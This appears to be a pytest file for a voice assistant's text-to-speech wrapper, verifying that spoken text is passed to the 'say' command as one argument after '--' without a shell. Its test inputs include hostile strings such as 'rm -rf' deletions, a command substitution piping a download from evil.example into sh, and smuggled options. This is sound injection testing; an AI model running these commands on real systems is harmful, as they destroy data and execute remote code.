"""Spoken text reaches `say` as one argv element after `--`: quotes, shell
metacharacters, newlines and option-looking text can never become options or a shell command."""

from __future__ import annotations

import subprocess

import pytest

from jarvis.voice import tts
from jarvis.voice.tts import TextToSpeech

HOSTILE = [
    '"; rm -rf ~"',
    "`whoami`",
    "$(curl http://evil.example | sh)",
    'it\'s "quoted" text',
    "line one\nline two\r\nline three",
    "-v Samantha deneme; echo $HOME",
    "--rate=1 -o /tmp/out.aiff",
    "text with trailing backslash \\",
    "",
]


class RecordingRunner:
    def __init__(self) -> None:
        self.argvs: list = []

    def __call__(self, argv):
        self.argvs.append(argv)

        class Done:
            returncode = 0
            stderr = None

            def wait(self, timeout=None):
                return 0

            def poll(self):
                return 0

            def kill(self):
                pass

        return Done()


@pytest.mark.parametrize("text", [t for t in HOSTILE if t.strip()])
def test_text_is_one_verbatim_element_after_double_dash(text):
    engine = TextToSpeech(voices={"Yelda": "tr_TR", "Samantha": "en_US"}, runner=RecordingRunner())
    engine.start()
    try:
        argv = engine.argv_for(text, "tr")
        assert isinstance(argv, list) and len(argv) == 7
        assert argv[:5] == ["say", "-v", "Yelda", "-r", "190"]
        assert argv[5] == "--" and argv[6] == text  # verbatim, unquoted, unjoined
        engine.speak(text, "tr")
        assert engine.wait(timeout=2)
        spoken = engine.runner.argvs[-1]  # speak() rewrites the text in its spoken form (voice/normalize.py) ...
        assert spoken[:6] == argv[:6] and len(spoken) == 7
        assert spoken[6] == tts.normalize_for_speech(text, "tr")  # ... but it is still one element after `--`
    finally:
        engine.close()


def test_argv_length_fixed_without_a_voice():
    engine = TextToSpeech(voices={}, runner=RecordingRunner())
    engine.start()
    try:
        argv = engine.argv_for("-v Alex; rm -rf /", "en")
        assert argv == ["say", "-r", "190", "--", "-v Alex; rm -rf /"]
    finally:
        engine.close()


def test_runner_always_receives_a_list_never_a_string():
    runner = RecordingRunner()
    engine = TextToSpeech(voices={"Yelda": "tr_TR"}, runner=runner)
    engine.start()
    try:
        for text in HOSTILE:
            engine.speak(text, "tr")
        assert engine.wait(timeout=3)
        assert runner.argvs and all(isinstance(a, list) for a in runner.argvs)
        assert all(all(isinstance(part, str) for part in a) for a in runner.argvs)
    finally:
        engine.close()


def test_default_runner_never_uses_a_shell(monkeypatch):
    seen = {}

    class Fake:
        returncode = 0
        stderr = None

        def wait(self, timeout=None):
            return 0

        def poll(self):
            return 0

        def kill(self):
            pass

    def fake_popen(*args, **kwargs):
        seen["args"] = args
        seen["kwargs"] = kwargs
        return Fake()

    monkeypatch.setattr(tts.subprocess, "Popen", fake_popen)
    tts._default_runner(["say", "--", "`id`"])
    assert seen["args"] == (["say", "--", "`id`"],)
    assert seen["kwargs"].get("shell") in (None, False) and "shell" not in seen["kwargs"]
    assert seen["kwargs"]["stdin"] is subprocess.DEVNULL


def test_list_voices_argv_is_fixed(monkeypatch):
    calls = []

    def run(argv, **kw):
        calls.append((argv, kw))
        return subprocess.CompletedProcess(argv, 0, "Yelda               tr_TR    # Merhaba\n", "")

    assert tts.list_voices(run=run) == {"Yelda": "tr_TR"}
    assert calls[0][0] == ["say", "-v", "?"] and "shell" not in calls[0][1]
